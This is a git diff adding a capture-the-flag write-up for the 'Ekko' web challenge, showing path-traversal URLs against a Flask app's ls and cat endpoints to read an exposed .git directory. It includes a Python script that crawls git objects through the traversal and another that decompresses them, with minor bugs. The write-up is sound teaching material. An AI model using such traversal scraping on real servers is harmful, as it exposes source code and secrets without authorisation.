@@ -56,5 +56,71 @@ Now , knowing the directory and the flag format we can use `grep -r "Securi" /us
 
 `Securinets{wH47_W45_7H47_3x4C7LY?4n_R845h_j41l??_0r_ls_4nd_grep_L3550n}`
 
+# Ekko 
+Task description : ls & cat made easy.
 
+We were given a web page that shows its source code written in Flask and a dockerfile.
+
+![image](https://github.com/Garroura/CyberTEK/assets/164345052/aec601f1-47d7-4f02-af0d-c97d20afd4b0)
+
+![image](https://github.com/Garroura/CyberTEK/assets/164345052/c380ed98-7b96-4919-9e7c-cdac11895bb6)
+
+
+Going through the code , we see that we can use the commands `ls` and `cat` with q as a query parameter. 
+Looking at the docker file , we know that there is a .git file in the app directory so we try `https://ekko.securinets-tekup.tech/ls?q=../app/.git`
+
+![image](https://github.com/Garroura/CyberTEK/assets/164345052/43012f69-e16d-4894-a58f-f582ea94dd63)
+
+
+I tried to go through each file and look for sensitive information , so i found this using `https://ekko.securinets-tekup.tech/cat?q=../app/.git/logs/HEAD`
+
+![image](https://github.com/Garroura/CyberTEK/assets/164345052/60c8fbaf-6167-45ae-8be9-c4137dc2f6b8)
+
+
+We can see the commmit changes history and their hashes , the user added a file named flag.txt to the git then deleted it , so we need to go back to that commit.
+Going through the git [docs](https://git-scm.com/book/fr/v2/Les-tripes-de-Git-Les-objets-de-Git)  and doing some researchs , i found that the git commits are stored in the `/.git/objetcs` directory using the commit hash ( This is how Git initially stores content - one file per content, named after the SHA-1 checksum of the content and its header. The subdirectory is named after the first 2 characters of the fingerprint and the file after the remaining 38 characters ). I tried the hash of the commit containing the flag.txt using `/cat?q=../app/.git/objects/c3/af58e5721c2dbd456ddef869a6a95d0eac473f`
+It shows non printable caracters and some encoded strings.
+
+![image](https://github.com/Garroura/CyberTEK/assets/164345052/a1693c54-37b1-430a-a773-4105f2db1587)
+
+Using the same git documentation , i looked for how blobs are encoded in git and i found that it is `zlib` compressed.
+We wrote a solver to get all the files in /.git/objects and decompress the content of each file in order to get the flag .
+```
+import os
+import requests, re
+
+url = "https://ekko.securinets-tekup.tech/"
+
+get_objects = requests.get(url + "ls?q=../app/.git/objects/" )
+obj = re.findall('\w+', get_objects.text)
+
+destination_folder = "Files"
+if get_objects.status_code == 200:
+    for i in obj:
+        com = requests.get(url + "ls?q=../app/.git/objects/" + i + '/')
+        get_com = re.findall('\w+',com.text)
+        for commut in get_com:
+            blob = requests.get(url + "cat?q=../app/.git/objects/" + i + '/' + commut)
+            with open(commut + ".zlib", 'wb') as f:
+                f.write(blob.content)
+            print("Downloaded successfully:", commut + ".zlib")
+        else:
+            print("Failed to download:", blob.status_code)
+````
+````
+import os
+import zlib
+folder_path = '`File'
+
+# Iterate through all files in the folder
+for filename in os.listdir(folder_path):
+    file_path = os.path.join(folder_path, filename)
+    try : 
+        with open(file_path,'rb') as f:
+            ct= f.read()
+        a = (zlib.decompress(ct))
+        print(f" : {file_path} :  {a}")
+    except : continue
+``
+`Securinets{y43h_n0w_U_Kn0W_Wh4T_15_917_bL0bS}`
 
